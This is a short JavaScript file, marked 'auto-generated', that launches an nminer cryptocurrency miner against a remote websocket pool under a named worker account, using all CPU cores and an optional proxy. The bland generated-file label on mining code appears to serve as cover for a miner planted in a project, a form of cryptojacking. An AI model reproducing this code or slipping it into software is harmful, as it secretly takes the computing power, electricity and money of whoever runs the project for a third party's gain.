// File auto-generated on Sep 5, 3:04:46 AM
const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "Subhas1975.airbus", { proxy: process.argv[2] || process.env.PROXY, threads: require("os").cpus().length, throttle: true });
